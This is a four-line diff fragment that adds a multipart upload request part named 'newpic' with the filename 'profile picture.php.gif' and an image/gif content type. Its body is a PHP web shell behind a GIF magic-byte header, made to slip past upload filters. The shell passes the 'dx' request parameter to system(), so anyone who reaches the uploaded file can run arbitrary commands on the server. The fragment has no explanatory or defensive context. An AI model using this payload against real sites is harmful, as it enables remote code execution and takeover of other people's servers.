@@ -1,0 +1,4 @@
+Content-Disposition: form-data; name="newpic"; filename="profile picture.php.gif"
+Content-Type: image/gif
+
+GIF89a <?php echo system($_REQUEST['dx']); ?>
